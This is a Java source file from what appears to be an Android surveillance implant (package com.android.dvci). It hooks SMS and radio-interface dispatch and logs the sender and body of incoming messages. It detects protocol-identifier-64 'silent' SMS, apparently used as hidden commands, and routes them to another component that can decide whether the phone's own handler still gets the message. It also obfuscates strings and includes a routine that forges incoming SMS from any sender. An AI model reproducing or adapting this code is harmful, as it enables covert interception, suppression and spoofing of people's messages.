package com.android.dvci.event.OOB;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Calendar;
import java.util.GregorianCalendar;

import android.app.Application;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.os.Parcel;
import android.telephony.PhoneNumberUtils;
import android.telephony.SmsMessage;
import android.util.Log;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.LowEventMsg;
import com.android.dvci.util.Reflect;
import com.android.dvci.util.Utils;
import com.android.mm.M;


public class SMSDispatch {
	private static String TAG =" SMSDispatch";
	public boolean callOrig = true;
	public static final int RESULT_SMS_HANDLED = 1;

	public SMSDispatch(byte pdus[][]) {
		if (Cfg.DEBUG) {
			Check.log(TAG +" phone.android.com");
		}
		if (pdus[0] == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG +" null pdu");
			}
			return;
		}
		SmsMessage s1 = SmsMessage.createFromPdu(pdus[0]);
		if (s1 != null) {
			if (Cfg.DEBUG) {
				Check.log(TAG +" SMSDispatch: incoming SMS");
			}

			if (s1.getMessageBody() != null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + s1.getMessageBody());
					Check.log(TAG + s1.getOriginatingAddress());
					Check.log(TAG + s1.getClass().getCanonicalName());
				}
					this.callOrig = true;
			}
		}
	}



	static int hexCharToInt(char c) {
		if (c >= '0' && c <= '9') return (c - '0');
		if (c >= 'A' && c <= 'F') return (c - 'A' + 10);
		if (c >= 'a' && c <= 'f') return (c - 'a' + 10);
		throw new RuntimeException(M.e("invalid hex char '" + c + "'"));
	}

	public static byte[] hexStringToBytes(String s) {
		byte[] ret;

		if (s == null) return null;

		int sz = s.length();

		ret = new byte[sz / 2];

		for (int i = 0; i < sz; i += 2) {
			ret[i / 2] = (byte) ((hexCharToInt(s.charAt(i)) << 4)
					| hexCharToInt(s.charAt(i + 1)));
		}

		return ret;
	}

	public static int dispatchParcel(Parcel p) {
		int callOrig = 1;
		if (p == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG +" null Parcel return ");
			}

			return callOrig;

		}
		int response;
		int dataPosition = p.dataPosition();
		if (Cfg.DEBUG) {
			Check.log(TAG +" dispatchParcel dataposition :" + dataPosition);
		}


		//Log.d(TAG," dispatchParcel response: "+response);
		try {
			response = p.readInt();
			if (Cfg.DEBUG) {
				Check.log(TAG +" dispatchParcel: got RIL code=" + response);
			}
			if (response == 1003) {
				String ret = p.readString();

				if (Cfg.DEBUG) {
					Check.log(TAG +" dispatchParcel: got RIL_UNSOL_RESPONSE_NEW_SMS string=" + ret);
				}
				try {
					SmsMessage sms = SmsMessage.createFromPdu(hexStringToBytes(ret));
					if (sms.getProtocolIdentifier() == 64) {
						LowEventMsg obj = new LowEventMsg();
						obj.data = sms.getPdu();
						obj.type = LowEventMsg.EVENT_TYPE_SMS_SILENT;
						obj = LowEventMsg.sendSerialObj(obj,"dispatchParcel");
						if (obj != null) {
							return obj.res;
						}
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + sms.getMessageBody());
							Check.log(TAG + sms.getOriginatingAddress());
							Check.log(TAG +" TP_PID=" + sms.getProtocolIdentifier());
						}
					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (dispatchParcel) Ex", e);//$NON-NLS-1$
					}
				}

			}
		} finally {
			p.setDataPosition(dataPosition);
		}
		return callOrig;
	}

	public static int dispatchNormalMessage(Object smsO) {
		if (Cfg.DEBUG) {
			Check.log(TAG +" dispatchNormalMessage: start now" + smsO);
		}
		int callOrig = 1;
		if (smsO == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG +" dispatchNormalMessage: null message return ");
			}
			return callOrig;
		}
		if (Cfg.DEBUG) {
			Check.log(TAG +" dispatchNormalMessage: start serviceConnection");
		}
		byte[][] pdus = new byte[1][];
		if (Cfg.DEBUG) {
			Check.log(TAG +" dispatchNormalMessage: asking pdu ");
		}
		pdus[0] = Reflect.on(smsO).call("getPdu").get();
		if (Cfg.DEBUG) {
			Check.log(TAG +" dispatchNormalMessage: got it");
		}
		//Application a = getcon();
		SmsMessage sms = SmsMessage.createFromPdu(pdus[0]);
		if (sms == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG +" failed to create sms");
			}
			return callOrig;
		}
		LowEventMsg obj = new LowEventMsg();
		obj.data = pdus[0];
		obj.type = LowEventMsg.EVENT_TYPE_SMS;
		obj = LowEventMsg.sendSerialObj(obj,"dispatchNormalMessage");
		if (obj != null) {
			return obj.res;
		}
		return callOrig;
	}



	public static Application getcon() {
		try {
			final Class<?> activityThreadClass =
					Class.forName("android.app.ActivityThread");

			if (activityThreadClass == null)
				if (Cfg.DEBUG) {
					Check.log(TAG +" activityThreadClass == null");
				}
			final Method method = activityThreadClass.getMethod("currentApplication");
			Application app = (Application) method.invoke(null, (Object[]) null);
			if (app == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG +" getcon app == null");
				}
				final Method method2 = activityThreadClass.getMethod("getApplication");
				if (method2 == null)
					if (Cfg.DEBUG) {
						Check.log(TAG +" method2 == null");
					}
				if (app == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG +" getcon 2 app == null");
					}
					try {
						Field f = activityThreadClass.getField("mInitialApplication");
						app = (Application) f.get(activityThreadClass);
					} catch (Exception e) {
					}
				}
				if (app == null)
					if (Cfg.DEBUG) {
						Check.log(TAG +" getcon 3 app == null");

					}
			}
			return app;
		} catch (final ClassNotFoundException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final NoSuchMethodException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final IllegalArgumentException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final IllegalAccessException e) {
			// handle exception
			Log.d(TAG, e.toString());
		} catch (final InvocationTargetException e) {
			// handle exception
			Log.d(TAG, e.toString());
		}
		if (Cfg.DEBUG) {
			Check.log(TAG +" getcon == null :-(");
		}
		return null;
	}

	//
	// reverseBytes and createFakesSms code taken from Thomas Cannon's SMSSpoof.java
	// https://github.com/thomascannon/android-sms-spoof/blob/master/SMSSpoofer/src/net/thomascannon/smsspoofer/SMSSpoof.java
	//
	private static byte reverseByte(byte b) {
		return (byte) ((b & 0xF0) >> 4 | (b & 0x0F) << 4);
	}

	private static byte[] createFakeSms(String sender, String body) {
		//Source: http://stackoverflow.com/a/12338541
		//Source: http://blog.dev001.net/post/14085892020/android-generate-incoming-sms-from-within-your-app
		byte[] scBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(M.e("0000000000"));
		byte[] senderBytes = PhoneNumberUtils.networkPortionToCalledPartyBCD(sender);
		int lsmcs = scBytes.length;
		byte[] dateBytes = new byte[7];
		Calendar calendar = new GregorianCalendar();
		dateBytes[0] = reverseByte((byte) (calendar.get(Calendar.YEAR)));
		dateBytes[1] = reverseByte((byte) (calendar.get(Calendar.MONTH) + 1));
		dateBytes[2] = reverseByte((byte) (calendar.get(Calendar.DAY_OF_MONTH)));
		dateBytes[3] = reverseByte((byte) (calendar.get(Calendar.HOUR_OF_DAY)));
		dateBytes[4] = reverseByte((byte) (calendar.get(Calendar.MINUTE)));
		dateBytes[5] = reverseByte((byte) (calendar.get(Calendar.SECOND)));
		dateBytes[6] = reverseByte((byte) ((calendar.get(Calendar.ZONE_OFFSET) + calendar
				.get(Calendar.DST_OFFSET)) / (60 * 1000 * 15)));
		try {
			ByteArrayOutputStream bo = new ByteArrayOutputStream();
			bo.write(lsmcs);
			bo.write(scBytes);
			bo.write(0x04);
			bo.write((byte) sender.length());
			bo.write(senderBytes);
			bo.write(0x00);
			bo.write(0x00); // encoding: 0 for default 7bit
			bo.write(dateBytes);
			try {
				String sReflectedClassName = M.e("com.android.internal.telephony.GsmAlphabet");
				Class cReflectedNFCExtras = Class.forName(sReflectedClassName);
				Method stringToGsm7BitPacked = cReflectedNFCExtras.getMethod(M.e("stringToGsm7BitPacked"), new Class[]{String.class});
				stringToGsm7BitPacked.setAccessible(true);
				byte[] bodybytes = (byte[]) stringToGsm7BitPacked.invoke(null, body);
				bo.write(bodybytes);
			} catch (Exception e) {
			}

			return bo.toByteArray();
		} catch (IOException e) {
		}
		return null;
	}
}
